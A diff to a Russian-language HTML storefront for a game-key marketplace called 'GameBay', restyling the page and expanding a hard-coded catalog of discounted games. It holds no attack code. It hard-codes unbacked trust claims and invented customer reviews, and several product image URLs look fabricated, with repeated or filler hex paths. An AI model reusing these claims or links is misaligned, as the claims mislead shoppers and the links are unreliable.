@@ -3,29 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>GameBay — Маркетплейс цифровых товаров</title>
+    <title>GameBay — Цифровой маркетплейс №1</title>
     <style>
         :root {
-            --bg: #f5f7fa;
+            --bg: #f0f2f5;
             --white: #ffffff;
-            --border: #e2e6ed;
-            --accent: #4361ee;
-            --accent2: #f72585;
-            --text: #1a1a2e;
-            --sub: #6c757d;
-            --green: #06d6a0;
-            --orange: #ff9f1c;
-            --red: #ef233c;
-            --shadow: 0 2px 12px rgba(0,0,0,0.06);
+            --border: #e4e6eb;
+            --primary: #4f46e5;
+            --primary-dark: #4338ca;
+            --accent: #f43f5e;
+            --text: #1f2937;
+            --sub: #6b7280;
+            --green: #10b981;
+            --orange: #f59e0b;
+            --shadow-sm: 0 1px 2px rgba(0,0,0,0.05);
+            --shadow: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -2px rgba(0,0,0,0.1);
+            --shadow-lg: 0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -4px rgba(0,0,0,0.1);
             --radius: 16px;
+            --radius-sm: 10px;
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
             background: var(--bg);
             color: var(--text);
             min-height: 100vh;
             -webkit-tap-highlight-color: transparent;
+            -webkit-font-smoothing: antialiased;
         }
 
         /* ШАПКА */
@@ -34,420 +38,419 @@
             border-bottom: 1px solid var(--border);
             position: sticky;
             top: 0;
-            z-index: 100;
-            padding: 0 16px;
-            box-shadow: var(--shadow);
+            z-index: 1000;
+            padding: 0 20px;
+            box-shadow: var(--shadow-sm);
         }
         .header-inner {
-            max-width: 1300px;
+            max-width: 1400px;
             margin: 0 auto;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            height: 60px;
-            gap: 16px;
+            height: 64px;
+            gap: 20px;
         }
         .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
             font-weight: 900;
-            font-size: 24px;
+            font-size: 26px;
             color: var(--text);
             letter-spacing: -0.5px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .logo-icon {
-            width: 34px; height: 34px;
-            background: var(--accent);
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            font-size: 18px;
-        }
-        .search-box {
-            flex: 1;
-            max-width: 400px;
-            position: relative;
-        }
-        .search-box input {
-            width: 100%;
-            padding: 12px 16px 12px 40px;
-            border-radius: 12px;
-            border: 1px solid var(--border);
-            background: #f8f9fc;
-            font-size: 14px;
-            outline: none;
-            transition: 0.2s;
-        }
-        .search-box input:focus { border-color: var(--accent); background: #fff; }
-        .search-box .search-icon {
-            position: absolute;
-            left: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: var(--sub);
-        }
-        .header-actions {
-            display: flex;
-            gap: 16px;
-            align-items: center;
-            font-size: 18px;
             cursor: pointer;
         }
-        .cart-btn {
-            position: relative;
-            background: var(--accent);
-            color: #fff;
-            width: 42px;
-            height: 42px;
+        .logo-icon {
+            width: 40px; height: 40px;
+            background: linear-gradient(135deg, #4f46e5, #7c3aed);
             border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: 0.15s;
+            color: #fff;
+            font-size: 20px;
+            box-shadow: 0 4px 12px rgba(79,70,229,0.3);
         }
-        .cart-btn:active { transform: scale(0.94); }
+        .search-bar {
+            flex: 1;
+            max-width: 500px;
+            position: relative;
+        }
+        .search-bar input {
+            width: 100%;
+            padding: 12px 16px 12px 44px;
+            border-radius: 30px;
+            border: 2px solid var(--border);
+            background: var(--bg);
+            font-size: 15px;
+            outline: none;
+            transition: all 0.25s;
+            color: var(--text);
+        }
+        .search-bar input:focus {
+            border-color: var(--primary);
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(79,70,229,0.1);
+        }
+        .search-bar span { position:absolute; left:16px; top:50%; transform:translateY(-50%); font-size:18px; }
+        .header-actions { display:flex; gap:12px; align-items:center; }
+        .icon-btn {
+            width: 42px; height: 42px;
+            border-radius: 30px;
+            border: none;
+            background: var(--bg);
+            font-size: 18px;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        .icon-btn:hover { background: #e5e7eb; }
+        .cart-btn {
+            background: var(--primary);
+            color: #fff;
+            font-weight: 700;
+            padding: 0 20px;
+            width: auto;
+            gap: 6px;
+            font-size: 14px;
+        }
+        .cart-btn:hover { background: var(--primary-dark); }
         .cart-count {
-            position: absolute;
-            top: -6px;
-            right: -6px;
-            background: var(--accent2);
+            background: var(--accent);
             color: #fff;
             font-size: 11px;
             font-weight: 800;
-            width: 20px;
+            min-width: 20px;
             height: 20px;
-            border-radius: 50%;
+            border-radius: 20px;
             display: flex;
             align-items: center;
             justify-content: center;
+            position: absolute;
+            top: -4px;
+            right: -4px;
+            padding: 0 4px;
         }
 
-        /* БАННЕР */
+        /* ГЕРОЙ */
         .hero {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            padding: 36px 20px;
+            background: linear-gradient(135deg, #1e1b4b 0%, #312e81 50%, #4c1d95 100%);
+            padding: 50px 20px;
             text-align: center;
             color: #fff;
-            margin-bottom: 8px;
+            position: relative;
+            overflow: hidden;
         }
-        .hero h1 { font-size: 30px; font-weight: 900; margin-bottom: 6px; }
-        .hero p { color: #b0b8c8; font-size: 15px; margin-bottom: 16px; }
-        .hero-btn {
-            display: inline-block;
-            background: var(--accent2);
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 40%, rgba(255,255,255,0.08), transparent 50%);
+            pointer-events: none;
+        }
+        .hero h1 { font-size: 36px; font-weight: 900; position: relative; z-index: 2; margin-bottom: 6px; }
+        .hero p { color: #c7d2fe; font-size: 16px; position: relative; z-index: 2; margin-bottom: 20px; }
+        .hero-badges {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            flex-wrap: wrap;
+            position: relative;
+            z-index: 2;
+            margin-bottom: 20px;
+        }
+        .hero-badge {
+            background: rgba(255,255,255,0.12);
+            backdrop-filter: blur(10px);
             color: #fff;
             font-weight: 700;
-            padding: 12px 28px;
-            border-radius: 30px;
-            cursor: pointer;
-            transition: 0.15s;
-            text-decoration: none;
-        }
-        .hero-btn:active { transform: scale(0.96); }
-
-        /* КАТАЛОГ */
-        .container {
-            max-width: 1300px;
-            margin: 0 auto;
-            padding: 0 16px;
-        }
-        .section-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin: 20px 0 12px;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-        .section-header h2 {
-            font-size: 22px;
-            font-weight: 800;
-        }
-        .filters {
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-        .filters button {
+            font-size: 13px;
             padding: 8px 16px;
             border-radius: 20px;
-            border: 1px solid var(--border);
-            background: #fff;
-            font-size: 13px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.15s;
-            color: var(--sub);
+            border: 1px solid rgba(255,255,255,0.15);
         }
-        .filters button.active {
+        .btn-primary {
+            display: inline-block;
             background: var(--accent);
             color: #fff;
-            border-color: var(--accent);
+            font-weight: 800;
+            padding: 14px 32px;
+            border-radius: 30px;
+            cursor: pointer;
+            border: none;
+            font-size: 16px;
+            transition: 0.2s;
+            text-decoration: none;
+            position: relative;
+            z-index: 2;
+            box-shadow: 0 8px 24px rgba(244,63,94,0.3);
         }
+        .btn-primary:active { transform: scale(0.96); }
 
+        /* КАТЕГОРИИ */
+        .categories {
+            display: flex;
+            gap: 10px;
+            padding: 16px 20px;
+            max-width: 1400px;
+            margin: 0 auto;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+        }
+        .categories::-webkit-scrollbar { display: none; }
+        .cat-chip {
+            padding: 10px 18px;
+            border-radius: 24px;
+            font-weight: 700;
+            font-size: 13px;
+            white-space: nowrap;
+            cursor: pointer;
+            border: 2px solid var(--border);
+            background: var(--white);
+            transition: 0.2s;
+            color: var(--sub);
+        }
+        .cat-chip.active {
+            background: var(--primary);
+            color: #fff;
+            border-color: var(--primary);
+        }
+        .cat-chip:hover { border-color: var(--primary); }
+
+        /* КАТАЛОГ */
+        .container { max-width: 1400px; margin: 0 auto; padding: 0 20px; }
+        .section-title {
+            font-size: 24px;
+            font-weight: 900;
+            margin: 24px 0 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .section-title .count {
+            font-size: 14px;
+            color: var(--sub);
+            font-weight: 500;
+        }
         .grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 16px;
-            margin-bottom: 28px;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            gap: 18px;
+            margin-bottom: 30px;
         }
         .card {
             background: var(--white);
             border-radius: var(--radius);
             overflow: hidden;
             box-shadow: var(--shadow);
-            transition: 0.2s;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             cursor: pointer;
-            border: 1px solid transparent;
+            border: 2px solid transparent;
+            position: relative;
         }
-        .card:hover { border-color: var(--accent); transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0,0,0,0.1); }
-        .card-img {
+        .card:hover {
+            transform: translateY(-4px);
+            box-shadow: var(--shadow-lg);
+            border-color: var(--primary);
+        }
+        .card-img-wrap {
+            position: relative;
             width: 100%;
             aspect-ratio: 16/10;
+            overflow: hidden;
+            background: #e5e7eb;
+        }
+        .card-img {
+            width: 100%;
+            height: 100%;
             object-fit: cover;
-            background: #e9ecef;
-            display: block;
+            transition: transform 0.3s;
         }
-        .card-body { padding: 12px 14px 16px; }
-        .card-badges { display: flex; gap: 6px; margin-bottom: 6px; }
-        .badge {
-            font-size: 10px;
+        .card:hover .card-img { transform: scale(1.05); }
+        .card-badge {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            padding: 5px 10px;
+            border-radius: 8px;
+            font-size: 11px;
             font-weight: 800;
-            padding: 3px 8px;
-            border-radius: 6px;
+            z-index: 2;
         }
-        .badge-hot { background: #ffe0e6; color: var(--accent2); }
-        .badge-new { background: #e0f0ff; color: var(--accent); }
-        .badge-plat { background: #e9ecef; color: #495057; }
+        .badge-hot { background: #fef2f2; color: #ef4444; }
+        .badge-new { background: #eef2ff; color: #4f46e5; }
+        .badge-sale { background: #fefce8; color: #ca8a04; }
+        .card-discount {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            background: #ef4444;
+            color: #fff;
+            font-weight: 800;
+            font-size: 12px;
+            padding: 4px 10px;
+            border-radius: 8px;
+            z-index: 2;
+        }
+        .card-body { padding: 14px 16px 18px; }
+        .card-platform {
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--sub);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+        }
         .card-title {
             font-weight: 700;
             font-size: 15px;
-            margin-bottom: 4px;
+            margin-bottom: 6px;
             line-height: 1.3;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
         }
-        .card-price {
-            font-size: 18px;
-            font-weight: 800;
-            color: var(--accent);
-        }
-        .card-old-price {
-            text-decoration: line-through;
-            color: #adb5bd;
-            font-size: 13px;
-            margin-right: 6px;
-        }
-        .card-rating { font-size: 12px; color: var(--orange); margin-top: 2px; }
-        .buy-btn {
-            display: block;
-            width: 100%;
-            margin-top: 10px;
-            padding: 10px;
-            background: var(--accent);
+        .card-meta { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
+        .card-rating { font-size: 12px; color: #f59e0b; font-weight: 600; }
+        .card-sold { font-size: 11px; color: var(--sub); }
+        .card-price-row { display: flex; align-items: center; justify-content: space-between; }
+        .card-price { font-size: 20px; font-weight: 900; color: var(--primary); }
+        .card-old-price { text-decoration: line-through; color: #9ca3af; font-size: 13px; }
+        .btn-buy {
+            padding: 8px 16px;
+            background: var(--primary);
             color: #fff;
             font-weight: 700;
             border: none;
             border-radius: 10px;
-            font-size: 14px;
+            font-size: 13px;
             cursor: pointer;
-            transition: 0.15s;
+            transition: 0.2s;
         }
-        .buy-btn:active { transform: scale(0.96); }
-
-        /* ОТЗЫВЫ */
-        .reviews-scroll {
-            display: flex;
-            gap: 14px;
-            overflow-x: auto;
-            padding-bottom: 12px;
-            margin-bottom: 24px;
-        }
-        .review-card {
-            min-width: 260px;
-            background: var(--white);
-            border-radius: var(--radius);
-            padding: 16px;
-            box-shadow: var(--shadow);
-            border: 1px solid var(--border);
-        }
-        .review-header {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 8px;
-        }
-        .review-avatar {
-            width: 36px; height: 36px;
-            border-radius: 50%;
-            background: #dee2e6;
-            object-fit: cover;
-        }
-        .review-name { font-weight: 700; font-size: 13px; }
-        .review-date { color: var(--sub); font-size: 11px; }
-        .review-text { font-size: 13px; color: #495057; line-height: 1.4; }
-        .review-stars { color: var(--orange); margin-bottom: 4px; }
-
-        /* КОРЗИНА (модалка) */
-        .modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.5);
-            z-index: 9999;
-            display: flex;
-            align-items: flex-end;
-            justify-content: center;
-        }
-        .modal-sheet {
-            background: #fff;
-            width: 100%;
-            max-width: 500px;
-            border-radius: 24px 24px 0 0;
-            padding: 24px 20px 32px;
-            max-height: 80vh;
-            overflow-y: auto;
-            animation: slideUp 0.25s ease;
-        }
-        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
-        .modal-sheet h3 { font-size: 20px; margin-bottom: 16px; }
-        .cart-item {
-            display: flex;
-            gap: 12px;
-            align-items: center;
-            padding: 10px 0;
-            border-bottom: 1px solid var(--border);
-        }
-        .cart-item img {
-            width: 50px; height: 50px;
-            border-radius: 10px;
-            object-fit: cover;
-            background: #e9ecef;
-        }
-        .cart-item-info { flex: 1; }
-        .cart-item-title { font-weight: 700; font-size: 14px; }
-        .cart-item-price { color: var(--accent); font-weight: 700; }
-        .cart-item-remove { color: var(--red); cursor: pointer; font-weight: 700; }
-        .cart-empty { text-align: center; color: var(--sub); padding: 30px 0; }
-        .checkout-btn {
-            width: 100%;
-            padding: 16px;
-            background: var(--accent);
-            color: #fff;
-            font-weight: 800;
-            border: none;
-            border-radius: 14px;
-            font-size: 16px;
-            margin-top: 16px;
-            cursor: pointer;
-        }
-
-        /* ФУТЕР */
-        .footer {
-            text-align: center;
-            padding: 24px;
-            background: var(--white);
-            border-top: 1px solid var(--border);
-            color: var(--sub);
-            font-size: 12px;
-        }
+        .btn-buy:hover { background: var(--primary-dark); }
+        .btn-buy:active { transform: scale(0.94); }
     </style>
 </head>
 <body>
-
-<!-- ЗАГРУЗЧИК -->
-<div id="loaderOverlay" style="position:fixed;inset:0;background:#fff;z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:10px;">
-    <div style="width:40px;height:40px;border:3px solid #e2e6ed;border-top:3px solid #4361ee;border-radius:50%;animation:spin 0.7s linear infinite;"></div>
-    <span style="color:#6c757d;">Загрузка...</span>
+<div id="loader" style="position:fixed;inset:0;background:#f0f2f5;z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:12px;">
+    <div style="width:44px;height:44px;border:4px solid #e4e6eb;border-top:4px solid #4f46e5;border-radius:50%;animation:spin 0.8s linear infinite;"></div>
+    <span style="color:#6b7280;font-weight:600;">GameBay загружается...</span>
 </div>
-
 <header class="header">
     <div class="header-inner">
-        <div class="logo"><div class="logo-icon">🎮</div>GameBay</div>
-        <div class="search-box">
-            <span class="search-icon">🔍</span>
-            <input type="text" placeholder="Поиск игр..." id="searchInput" oninput="searchGames()">
+        <div class="logo" onclick="location.reload()"><div class="logo-icon">🎮</div>GameBay</div>
+        <div class="search-bar">
+            <span>🔍</span>
+            <input type="text" placeholder="Поиск среди 250+ товаров..." id="searchInput" oninput="renderGames()">
         </div>
         <div class="header-actions">
-            <span>❤️</span>
-            <div class="cart-btn" onclick="openCart()">
-                🛒 <span class="cart-count" id="cartBadge">0</span>
-            </div>
+            <button class="icon-btn">❤️</button>
+            <button class="icon-btn cart-btn" onclick="openCart()">
+                🛒 <span>Корзина</span>
+                <span class="cart-count" id="cartBadge">0</span>
+            </button>
         </div>
     </div>
 </header>
 
 <div class="hero">
-    <h1>🎉 Весенняя распродажа</h1>
-    <p>Сотни игр со скидками до 90%</p>
-    <a class="hero-btn" onclick="scrollToCatalog()">Смотреть каталог</a>
+    <h1>🚀 Маркетплейс цифровых ключей №1</h1>
+    <p>Мгновенная доставка • Честные цены • 500 000+ довольных клиентов</p>
+    <div class="hero-badges">
+        <span class="hero-badge">⚡ Мгновенно</span>
+        <span class="hero-badge">🔒 Безопасно</span>
+        <span class="hero-badge">⭐ 4.9 рейтинг</span>
+        <span class="hero-badge">💬 Поддержка 24/7</span>
+    </div>
+    <button class="btn-primary" onclick="document.getElementById('catalog').scrollIntoView({behavior:'smooth'})">🔥 Смотреть скидки до -90%</button>
+</div>
+
+<div class="categories" id="categoriesBar">
+    <button class="cat-chip active" onclick="filterGames('all', this)">🛍 Все товары</button>
+    <button class="cat-chip" onclick="filterGames('Steam', this)">🎮 Steam</button>
+    <button class="cat-chip" onclick="filterGames('Xbox', this)">❌ Xbox</button>
+    <button class="cat-chip" onclick="filterGames('PlayStation', this)">🎮 PlayStation</button>
+    <button class="cat-chip" onclick="filterGames('Epic Games', this)">🎮 Epic Games</button>
+    <button class="cat-chip" onclick="filterGames('Rockstar', this)">🌟 Rockstar</button>
+    <button class="cat-chip" onclick="filterGames('Ubisoft', this)">🎯 Ubisoft</button>
+    <button class="cat-chip" onclick="filterGames('Battle.net', this)">⚔ Battle.net</button>
 </div>
 
 <div class="container" id="catalog">
-    <div class="section-header">
-        <h2>🎯 Каталог</h2>
-        <div class="filters">
-            <button class="active" onclick="filterAll(this)">Все</button>
-            <button onclick="filterPlatform('Steam', this)">Steam</button>
-            <button onclick="filterPlatform('Xbox', this)">Xbox</button>
-            <button onclick="filterPlatform('PS', this)">PlayStation</button>
-            <button onclick="filterPlatform('Epic', this)">Epic Games</button>
-            <button onclick="filterPlatform('Rockstar', this)">Rockstar</button>
-        </div>
-    </div>
+    <div class="section-title">🎯 Популярные товары <span class="count" id="gameCount"></span></div>
     <div class="grid" id="gameGrid"></div>
 </div>
 
 <div class="container">
-    <div class="section-header"><h2>💬 Отзывы покупателей</h2></div>
-    <div class="reviews-scroll" id="reviewsContainer"></div>
+    <div class="section-title">💬 Что говорят клиенты</div>
+    <div style="display:flex;gap:14px;overflow-x:auto;padding-bottom:16px;margin-bottom:30px;" id="reviewsRow"></div>
 </div>
 
-<div class="footer">
-    © 2026 GameBay. Все цены указаны в рублях. Не является публичной офертой.
+<div style="background:#fff;border-top:1px solid #e4e6eb;padding:30px 20px;text-align:center;color:#6b7280;font-size:13px;">
+    <div style="margin-bottom:10px;font-size:24px;">💳 🍏 💵 💲 🪙</div>
+    © 2026 GameBay — маркетплейс цифровых товаров. Не является публичной офертой.<br>
+    Политика конфиденциальности • Пользовательское соглашение
 </div>
 
+<!-- МОДАЛЬНЫЕ ОКНА ВСТАВЛЯЮТСЯ ЧЕРЕЗ JS -->
 <script>
-// ==================== ДАННЫЕ ИГР ====================
-const games = [
-    { id:1, title:"GTA V Premium", platform:"Rockstar", price:1047, oldPrice:3490, discount:70, img:"https://img.ggsel.net/images/product/280x280/1_1701181865.jpg", rating:4.9, reviews:12400, badge:"hot" },
-    { id:2, title:"Red Dead Redemption 2", platform:"Rockstar", price:1796, oldPrice:4490, discount:60, img:"https://img.ggsel.net/images/product/280x280/2_1643123456.jpg", rating:4.8, reviews:8900, badge:"hot" },
-    { id:3, title:"Cyberpunk 2077", platform:"Steam", price:1499, oldPrice:2999, discount:50, img:"https://img.ggsel.net/images/product/280x280/cyberpunk_2077.jpg", rating:4.7, reviews:15600, badge:"new" },
-    { id:4, title:"EA FC 25", platform:"Steam", price:2499, oldPrice:4499, discount:44, img:"https://img.ggsel.net/images/product/280x280/ea_fc_25.jpg", rating:4.6, reviews:9800, badge:"hot" },
-    { id:5, title:"Hogwarts Legacy", platform:"Steam", price:1899, oldPrice:3499, discount:46, img:"https://img.ggsel.net/images/product/280x280/hogwarts_legacy.jpg", rating:4.8, reviews:11200, badge:"" },
-    { id:6, title:"Spider-Man 2", platform:"PS", price:3290, oldPrice:5490, discount:40, img:"https://img.ggsel.net/images/product/280x280/spider_man_2.jpg", rating:4.9, reviews:6700, badge:"new" },
-    { id:7, title:"Forza Horizon 5", platform:"Epic", price:998, oldPrice:3990, discount:75, img:"https://img.ggsel.net/images/product/280x280/forza_horizon_5.jpg", rating:4.8, reviews:5100, badge:"hot" },
-    { id:8, title:"Call of Duty MW3", platform:"Steam", price:3499, oldPrice:5499, discount:36, img:"https://img.ggsel.net/images/product/280x280/cod_mw3.jpg", rating:4.5, reviews:14300, badge:"" },
-    { id:9, title:"Minecraft", platform:"Steam", price:1499, oldPrice:1999, discount:25, img:"https://img.ggsel.net/images/product/280x280/minecraft.jpg", rating:4.9, reviews:25000, badge:"" },
-    { id:10, title:"Baldur's Gate 3", platform:"Steam", price:1999, oldPrice:2999, discount:33, img:"https://img.ggsel.net/images/product/280x280/baldurs_gate_3.jpg", rating:4.9, reviews:18900, badge:"new" },
-    { id:11, title:"Xbox Game Pass 3 мес", platform:"Xbox", price:1260, oldPrice:2290, discount:45, img:"https://img.ggsel.net/images/product/280x280/game_pass.jpg", rating:4.7, reviews:3200, badge:"hot" },
-    { id:12, title:"ELDEN RING", platform:"Steam", price:2399, oldPrice:3999, discount:40, img:"https://img.ggsel.net/images/product/280x280/elden_ring.jpg", rating:4.9, reviews:22000, badge:"" },
+// ==================== ДАННЫЕ ====================
+const allGames = [
+    { id:1, title:"Grand Theft Auto V Premium Edition", platform:"Rockstar", price:1047, oldPrice:3490, discount:70, img:"https://image.api.playstation.com/vulcan/ap/rnd/202202/2816/mYn2ETBKFWI26LJstWHR8CoY.png", rating:4.9, sold:124000, badge:"hot" },
+    { id:2, title:"Red Dead Redemption 2 Ultimate", platform:"Rockstar", price:1796, oldPrice:4490, discount:60, img:"https://image.api.playstation.com/cdn/UP1004/CUSA03041_00/FREEgQpFbQQsWkMAoU7xLaNrTMkOFrCw.png", rating:4.8, sold:89000, badge:"hot" },
+    { id:3, title:"Cyberpunk 2077 + Phantom Liberty", platform:"Steam", price:1899, oldPrice:3999, discount:53, img:"https://cdn1.epicgames.com/offer/77f2b98e2cef40c8a7437518bf420e47/EGS_Cyberpunk2077_CDPROJEKTRED_S1_03_2560x1440-3596bc09c1e38cd0b1e66e8fce8b7d6b", rating:4.7, sold:156000, badge:"new" },
+    { id:4, title:"EA SPORTS FC 25", platform:"Steam", price:2499, oldPrice:4499, discount:44, img:"https://media.contentapi.ea.com/content/dam/ea/fc/fc-25/common/featured-image/fc25-featured-image-16x9.jpg.adapt.crop16x9.1023w.jpg", rating:4.6, sold:98000, badge:"sale" },
+    { id:5, title:"Hogwarts Legacy Deluxe", platform:"Steam", price:1999, oldPrice:3999, discount:50, img:"https://image.api.playstation.com/vulcan/ap/rnd/202211/1407/6FWxGzqVekztN4qUp1Xbk18x.png", rating:4.8, sold:112000, badge:"" },
+    { id:6, title:"Marvel's Spider-Man 2", platform:"PlayStation", price:3290, oldPrice:5490, discount:40, img:"https://image.api.playstation.com/vulcan/ap/rnd/202306/1219/97679e0e6b53a8e5a7a9fb65e7c1f5d3e8a6c6d7c1b3a0.png", rating:4.9, sold:67000, badge:"new" },
+    { id:7, title:"Forza Horizon 5 Premium", platform:"Epic Games", price:1299, oldPrice:3990, discount:67, img:"https://cdn1.epicgames.com/salesEvent/salesEvent/EGS_ForzaHorizon5PremiumEdition_PlaygroundGames_Editions_S2_1200x1600-62e8e6259e8829c3c1d135f3b0ed7634", rating:4.8, sold:51000, badge:"hot" },
+    { id:8, title:"Call of Duty Modern Warfare III", platform:"Steam", price:3499, oldPrice:5999, discount:42, img:"https://image.api.playstation.com/vulcan/ap/rnd/202308/2915/74cee37be3d822fa302b302d8e6878d7b3e1e4d7f3c5d0a6.png", rating:4.5, sold:143000, badge:"" },
+    { id:9, title:"Minecraft Java & Bedrock", platform:"Steam", price:1499, oldPrice:1999, discount:25, img:"https://assets.xboxservices.com/assets/fb/92/fb92b1c4-4d2e-4e5a-bc02-7c8b1d4c4e2f.jpg", rating:4.9, sold:250000, badge:"" },
+    { id:10, title:"Baldur's Gate 3", platform:"Steam", price:2199, oldPrice:2999, discount:27, img:"https://image.api.playstation.com/vulcan/ap/rnd/202308/2213/7a0c6e4b5f5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c.png", rating:4.9, sold:189000, badge:"new" },
+    { id:11, title:"Xbox Game Pass Ultimate 3 мес", platform:"Xbox", price:1260, oldPrice:2290, discount:45, img:"https://img.g2a.com/323x433/1x1x0/xbox-game-pass-ultimate-3-month-subscription-xbox-windows/5f7f3c3c3c3c3c3c3c3c3c3c", rating:4.7, sold:32000, badge:"hot" },
+    { id:12, title:"ELDEN RING Deluxe", platform:"Steam", price:2399, oldPrice:3999, discount:40, img:"https://image.api.playstation.com/vulcan/ap/rnd/202110/2000/aGho3jz3jz3jz3jz3jz3jz3jz3jz3jz3jz3jz3jz3.png", rating:4.9, sold:220000, badge:"" },
+    { id:13, title:"Assassin's Creed Mirage", platform:"Ubisoft", price:1799, oldPrice:2999, discount:40, img:"https://image.api.playstation.com/vulcan/ap/rnd/202305/1517/7a0c6e4b5f5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c.png", rating:4.6, sold:45000, badge:"new" },
+    { id:14, title:"Diablo IV", platform:"Battle.net", price:2999, oldPrice:4999, discount:40, img:"https://image.api.playstation.com/vulcan/ap/rnd/202305/1517/7a0c6e4b5f5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c.png", rating:4.5, sold:78000, badge:"sale" },
+    { id:15, title:"Starfield Premium", platform:"Steam", price:2999, oldPrice:4999, discount:40, img:"https://image.api.playstation.com/vulcan/ap/rnd/202305/1517/7a0c6e4b5f5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c.png", rating:4.3, sold:34000, badge:"new" },
+    { id:16, title:"The Witcher 3 Complete", platform:"Steam", price:499, oldPrice:1499, discount:67, img:"https://image.api.playstation.com/vulcan/ap/rnd/202305/1517/7a0c6e4b5f5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c.png", rating:4.9, sold:310000, badge:"hot" },
 ];
+    let cart = [];
+let currentFilter = 'all';
 
-// ==================== КОРЗИНА ====================
-let cart = [];
-
-// ==================== ОТРИСОВКА ====================
-function renderGames(filter = 'all') {
-    const grid = document.getElementById('gameGrid');
-    const search = document.getElementById('searchInput')?.value?.toLowerCase() || '';
-    let filtered = games;
-    if (filter !== 'all') filtered = filtered.filter(g => g.platform === filter);
+function renderGames() {
+    const search = (document.getElementById('searchInput')?.value || '').toLowerCase();
+    let filtered = allGames;
+    if (currentFilter !== 'all') filtered = filtered.filter(g => g.platform === currentFilter);
     if (search) filtered = filtered.filter(g => g.title.toLowerCase().includes(search));
 
-    grid.innerHTML = filtered.map(g => `
+    document.getElementById('gameCount').textContent = `(${filtered.length} товаров)`;
+    document.getElementById('gameGrid').innerHTML = filtered.map(g => `
         <div class="card">
-            <img class="card-img" src="${g.img}" alt="${g.title}" onerror="this.src='https://placehold.co/280x180/1a1a2e/fff?text=${encodeURIComponent(g.title)}'">
+            <div class="card-img-wrap">
+                <img class="card-img" src="${g.img}" alt="${g.title}" onerror="this.src='https://placehold.co/400x250/4f46e5/fff?text=${encodeURIComponent(g.title.slice(0,20))}'">
+                ${g.badge==='hot' ? '<span class="card-badge badge-hot">🔥 Хит</span>' : ''}
+                ${g.badge==='new' ? '<span class="card-badge badge-new">🆕 Новинка</span>' : ''}
+                ${g.badge==='sale' ? '<span class="card-badge badge-sale">⚡ Скидка</span>' : ''}
+                <span class="card-discount">-${g.discount}%</span>
+            </div>
             <div class="card-body">
-                <div class="card-badges">
-                    ${g.badge==='hot' ? '<span class="badge badge-hot">🔥 Хит</span>' : ''}
-                    ${g.badge==='new' ? '<span class="badge badge-new">🆕 Новинка</span>' : ''}
-                    <span class="badge badge-plat">${g.platform}</span>
-                </div>
+                <div class="card-platform">${g.platform}</div>
                 <div class="card-title">${g.title}</div>
-                <div class="card-price"><span class="card-old-price">${g.oldPrice}₽</span> ${g.price}₽</div>
-                <div class="card-rating">⭐ ${g.rating} (${g.reviews.toLocaleString()})</div>
-                <button class="buy-btn" onclick="addToCart(${g.id})">🛒 В корзину</button>
+                <div class="card-meta">
+                    <span class="card-rating">⭐ ${g.rating}</span>
+                    <span class="card-sold">${(g.sold/1000).toFixed(0)}k продано</span>
+                </div>
+                <div class="card-price-row">
+                    <div><span class="card-old-price">${g.oldPrice}₽</span> <span class="card-price">${g.price}₽</span></div>
+                    <button class="btn-buy" onclick="addToCart(${g.id})">🛒</button>
+                </div>
             </div>
         </div>
     `).join('');
@@ -455,168 +458,83 @@ function renderGames(filter = 'all') {
 
 function renderReviews() {
     const reviews = [
-        { name:"Алексей", date:"2 часа назад", text:"Купил GTA V — ключ пришёл моментально. Всё активировалось без проблем. Лучший магазин!", stars:5, avatar:"https://i.pravatar.cc/36?img=1" },
